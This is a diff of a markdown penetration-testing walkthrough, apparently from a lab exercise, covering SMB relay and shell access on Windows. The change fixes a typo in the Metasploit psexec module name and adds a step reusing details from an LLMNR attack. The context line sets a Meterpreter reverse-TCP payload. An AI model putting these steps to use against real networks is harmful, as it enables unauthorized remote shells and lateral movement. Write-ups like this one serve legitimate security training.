@@ -116,12 +116,16 @@ SMB relay attack with -c 'whoami' flag successful
 ## 🚩 Gaining Shell Access
 
 ### Metasploit module using psexec  
-In metasploit we have chosen the windoes/smb/psexec module  
+In metasploit we have chosen the windows/smb/psexec module  
 ![image](https://github.com/user-attachments/assets/5a95bb0b-2ef1-4559-9047-239d20571096)  
 
 and set payload to x64 compatible as most* modern machines run x64.
 
             set payload windows/x64/meterpreter/reverse_tcp
+
+configure the options with the information gathered in the LLMNR attack.
+
+![image](https://github.com/user-attachments/assets/24e94831-edbe-47ec-b388-2287fe5ac5ba)
 
 
 ### Manual mode using psexec.py  
